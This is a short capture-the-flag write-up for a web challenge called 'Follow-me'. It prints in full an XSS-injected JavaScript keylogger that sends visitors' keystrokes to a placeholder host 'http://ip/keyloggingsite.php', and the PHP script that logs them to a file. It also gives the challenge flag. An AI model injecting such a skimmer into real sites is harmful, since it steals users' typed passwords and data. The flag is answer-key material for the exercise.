## Problem: Follow-me

A common vulnerability exists in this website. A hacker has already found it and has exploited it. You need to trace his steps and get the flag just like he did.

## Hint: 

The hacker exploited the XSS vulnerability. Dig deeper by checking was kind of script he injected.

## Explanation:

The hacker has injected a malicious javascript on the webpage. So, everytime a user visits the page, the javascript is loaded. The javascript is:

```
var keys = '';
 
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
 
window.setInterval(function(){
    new Image().src = 'http://ip/keyloggingsite.php?keylog=' + keys;
    keys = '';
}, 200);

```
The javascript is recording keystrokes of every user and sending it to the php server. 

The php script is:
```
<?php
 
if(!empty($_GET['keylog'])) {
    $logfile = fopen('logs.txt', 'a+');
    fwrite($logfile, $_GET['keylog']);
    fclose($logfile);
}
?>
```

We need to get access to the logs.txt file to get the flag

`lakshya_CTF{tr4cing_Th3_f00tst3p5}`